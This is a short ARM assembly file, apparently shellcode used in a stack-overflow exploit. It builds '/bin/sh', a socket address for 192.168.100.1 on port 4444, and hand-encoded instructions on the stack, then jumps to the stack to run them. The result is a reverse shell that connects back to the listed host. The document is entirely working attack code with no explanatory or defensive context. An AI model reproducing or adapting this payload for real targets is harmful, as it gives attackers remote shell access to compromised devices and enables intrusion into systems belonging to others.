.section .text
.global _start  
_start:
/* Move stack pointer above overwritten saved LR */
sub sp, #16
/* BINSH */
mov r1, #0x68
lsl r1, #8
add r1, #0x73
lsl r1, #8
add r1, #0x2f
push {r1}       // /sh
mov r1, #0x6e
lsl r1, #8
add r1, #0x69
lsl r1, #8
add r1, #0x62
lsl r1, #8
add r1, #0x2f
push {r1}       // /bin
/* ADDR */
mov r1, #0x164
lsl r1, #8
add r1, #0xa8
lsl r1, #8
add r1, #0xc0
push {r1}       // 192.168.100.1
mov r1, #0x5c
lsl r1, #8
add r1, #0x11
lsl r1, #16
add r1, #0x02
push {r1}       // 4444; AF_INET, SOCK_STREAM
/* execve */
mov r3, #0xef
lsl r3, #24
push {r3}       // svc  #0
/* ... */
mov r1, #0xe3
lsl r1, #8
add r1, #0xa0
lsl r1, #8
add r1, #0x10
lsl r1, #8
add r1, #0x01
push {r1}       // mov  r1, #1
/* jump to shellcode */
bx sp
